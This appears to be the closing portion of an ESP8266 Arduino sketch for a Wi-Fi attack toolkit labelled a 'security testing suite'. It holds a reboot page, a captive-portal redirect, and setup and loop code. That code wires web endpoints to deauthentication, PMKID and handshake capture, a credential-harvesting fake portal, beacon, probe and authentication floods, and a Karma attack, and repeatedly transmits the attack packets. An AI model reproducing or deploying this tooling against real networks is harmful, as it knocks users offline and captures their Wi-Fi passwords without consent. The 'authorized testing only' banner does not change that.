    html += "body{background:#c0392b;color:#fff;text-align:center;padding:50px;font-family:Arial;margin:0}";
    html += "h1{font-size:2.5em;margin:0}";
    html += ".spinner{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:30px auto}";
    html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
    html += "p{font-size:16px;margin-top:20px}";
    html += "</style></head><body>";
    html += "<h1> Rebooting System</h1>";
    html += "<div class='spinner'></div>";
    html += "<p>Device will restart in 3 seconds...</p>";
    html += "<p>Reconnect to the access point after reboot.</p>";
    html += "</body></html>";
    
    state.server->send(200, "text/html", html);
    
    Serial.println("\n" + String('=', 50));
    Serial.println("SYSTEM REBOOT INITIATED");
    Serial.println(String('=', 50));
    
    delay(1000);
    ESP.restart();
  }
  
  void handleNotFound() {
    if (state.portalActive) {
      state.server->sendHeader("Location", "/");
      state.server->send(302);
    } else {
      state.server->send(404, "text/plain", "404 - Not Found");
    }
  }
}

void setup() {
  Serial.begin(115200);
  delay(100);
  
  pinMode(Config::LED_PIN, OUTPUT);
  digitalWrite(Config::LED_PIN, HIGH);
  
  Serial.println("\n\n" + String('=', 60));
  Serial.println("  ESP8266 SECURITY TESTING SUITE v2.2 - ENHANCED");
  Serial.println("  Educational & Authorized Testing Only");
  Serial.println("  Unauthorized use is ILLEGAL and UNETHICAL");
  Serial.println(String('=', 60));
  Serial.println();
  
  state.startTime = millis();
  state.scanData = "Click 'WiFi Scan' to find networks";
  state.hostData = "Click 'Host Scan' to find devices";
  state.deauthData = "Select target from scan";
  state.pmkidData = "Start PMKID capture";
  state.handshakeData = "Start handshake capture";
  state.credentialData = "Start portal to capture";
  state.beaconData = "Start beacon flood";
  state.probeData = "Start probe flood";
  state.authData = "Select target from scan";
  state.karmaData = "Start Karma attack";
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
  delay(100);
  
  IPAddress ip = WiFi.softAPIP();
  Serial.println("✓ Access Point Started");
  Serial.println("  SSID: " + String(Config::AP_SSID));
  Serial.println("  Password: " + String(Config::AP_PASSWORD));
  Serial.println("  IP Address: " + ip.toString());
  Serial.println("  MAC Address: " + WiFi.softAPmacAddress());
  Serial.println();
  
  state.server = new ESP8266WebServer(Config::WEB_PORT);
  state.adminServer = new ESP8266WebServer(Config::ADMIN_PORT);
  state.dnsServer = new DNSServer();
  
  if (!state.server || !state.adminServer || !state.dnsServer) {
    Serial.println("FATAL ERROR: Failed to allocate server memory!");
    Serial.println("Rebooting...");
    delay(3000);
    ESP.restart();
  }
  
  state.server->on("/", Handlers::handleRoot);
  state.server->on("/s", Handlers::handleScan);
  state.server->on("/h", Handlers::handleHosts);
  state.server->on("/d", Handlers::handleDeauthStart);
  state.server->on("/ds", Handlers::handleDeauthStop);
  state.server->on("/p", Handlers::handlePMKIDStart);
  state.server->on("/ps", Handlers::handlePMKIDStop);
  state.server->on("/hsh", Handlers::handleHandshakeStart);
  state.server->on("/hs", Handlers::handleHandshakeStop);
  state.server->on("/handshake", Handlers::handleHandshakePage);
  state.server->on("/handshake/clear", Handlers::handleHandshakeClear);
  state.server->on("/e", Handlers::handlePortalStart);
  state.server->on("/es", Handlers::handlePortalStop);
  state.server->on("/n", Handlers::handleSnifferStart);
  state.server->on("/ns", Handlers::handleSnifferStop);
  state.server->on("/b", Handlers::handleBeaconStart);
  state.server->on("/bs", Handlers::handleBeaconStop);
  state.server->on("/pr", Handlers::handleProbeStart);
  state.server->on("/prs", Handlers::handleProbeStop);
  state.server->on("/au", Handlers::handleAuthStart);
  state.server->on("/aus", Handlers::handleAuthStop);
  state.server->on("/k", Handlers::handleKarmaStart);
  state.server->on("/ks", Handlers::handleKarmaStop);
  state.server->on("/c", Handlers::handleCredentials);
  state.server->on("/x", Handlers::handleClear);
  state.server->on("/stop", Handlers::handleStopAll);
  state.server->on("/r", Handlers::handleReboot);
  state.server->on("/submit", HTTP_POST, Handlers::handleSubmit);
  state.server->onNotFound(Handlers::handleNotFound);
  
  state.adminServer->on("/", AdminHandlers::handleAdminRoot);
  state.adminServer->on("/admin", AdminHandlers::handleAdminRoot);
  state.adminServer->on("/admin/json", AdminHandlers::handleAdminJSON);
  state.adminServer->on("/admin/clear", AdminHandlers::handleAdminClear);
  state.adminServer->onNotFound(AdminHandlers::handleAdminNotFound);
  
  state.server->begin();
  state.adminServer->begin();
  Serial.println("✓ Web Server Started on port " + String(Config::WEB_PORT));
  Serial.println("✓ Admin Server Started on port " + String(Config::ADMIN_PORT));
  Serial.println("✓ DNS Server Initialized");
  Serial.println();
  Serial.println(String('=', 60));
  Serial.println("System ready!");
  Serial.println("Main Dashboard: http://" + ip.toString());
  Serial.println("Admin Panel: http://" + ip.toString() + ":" + String(Config::ADMIN_PORT) + "/admin");
  Serial.println("Handshake Viewer: http://" + ip.toString() + "/handshake");
  Serial.println(String('=', 60));
  Serial.println();
}

void loop() {
  if (state.server) {
    state.server->handleClient();
  }
  
  if (state.adminServer) {
    state.adminServer->handleClient();
  }
  
  if (state.dnsActive && state.dnsServer) {
    state.dnsServer->processNextRequest();
  }
  
  if (state.deauthActive) {
    if (millis() - state.lastDeauth >= Config::DEAUTH_INTERVAL) {
      Attacks::sendDeauthPacket();
      state.lastDeauth = millis();
    }
  }
  
  if (state.beaconFloodActive) {
    if (millis() - state.lastBeacon >= Config::BEACON_INTERVAL) {
      Attacks::sendBeaconPacket();
      state.lastBeacon = millis();
    }
  }
  
  if (state.probeFloodActive) {
    if (millis() - state.lastProbe >= Config::PROBE_INTERVAL) {
      Attacks::sendProbePacket();
      state.lastProbe = millis();
    }
  }
  
  if (state.authFloodActive) {
    if (millis() - state.lastAuth >= Config::AUTH_INTERVAL) {
      Attacks::sendAuthPacket();
      state.lastAuth = millis();
    }
  }
  
  // Check for PMKID timeout
  if (state.pmkidActive && millis() - state.lastPMKIDCheck > Config::PMKID_TIMEOUT) {
    if (state.eapolCount == 0) {
      // No EAPOL frames received, try a different channel
      state.targetChannel = (state.targetChannel % 13) + 1;
      wifi_set_channel(state.targetChannel);
      state.pmkidData = "Listening on CH " + String(state.targetChannel) + " - No EAPOL frames, trying next channel";
    }
    state.lastPMKIDCheck = millis();
  }
  
  if (state.deauthActive || state.pmkidActive || state.portalActive || state.snifferActive ||
      state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive) {
    if (millis() - state.lastBlink >= Config::LED_BLINK_INTERVAL) {
      digitalWrite(Config::LED_PIN, !digitalRead(Config::LED_PIN));
      state.lastBlink = millis();
    }
  } else {
    digitalWrite(Config::LED_PIN, HIGH); 
  }
  
  if (millis() - state.lastWatchdog >= Config::WATCHDOG_TIMEOUT) {
    Utils::resetWatchdog();
  }
  
  yield();
}
